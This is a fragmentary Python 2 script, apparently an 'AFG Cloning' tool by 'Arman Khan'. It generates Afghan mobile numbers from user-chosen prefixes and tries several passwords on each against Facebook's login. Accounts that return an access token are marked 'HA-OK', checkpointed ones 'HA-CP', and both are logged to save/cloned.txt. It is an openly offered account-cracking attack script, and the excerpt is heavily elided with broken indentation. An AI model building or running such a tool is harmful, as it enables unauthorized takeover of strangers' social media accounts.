...
\033[1;94mFACEBOOK  Arman Khan
                  
\033[1;92mFB PAGE   Arman Khan
...
/__/     \__\ | _| `._____||__|  |__| /__/     \__\ |__| \__| 
                         ...
                         DON'T COPY MY SCRIPT
                                      Arman Khan     
                                              HA
╔══──────────────────────────╗─══╗
║OWNER 💓💓💓Arman Khosti (HA)                           ║
║  GITHUB 💝💝💝 Arman Khan                         ║
║ FACEBOOK 💝💝💝Arman Khan                     ║
║  ENJOY 💝💝💝AFG Cloning                           ║
║   Note 💝💝💝Ues wifi Network                      ║
╚══──────────────────────────╝─══╝
"""
print("""
Owner: Arman Khan(HA)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-https://wa.me/+93783361438')
    else:
...
def action():
    ...
    if peak =='':
        ...
        os.system("clear")
        print logo2
        print "\033[1;94mEnter any AFGHANISTAN Mobile code Number"+'\n'
        print '\033[1;92mEnter any code 790 791 792 793 794 795 796 797 798 799 780 781 782 783 784 785 786 787 788 789 731 '
        for i in numm:
            print('x' * i)
        try:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[HA-OK]  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[HA-CP] ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[HA-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[HA-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[HA-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[HA-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[HA-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[HA-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[HA-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[HA-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
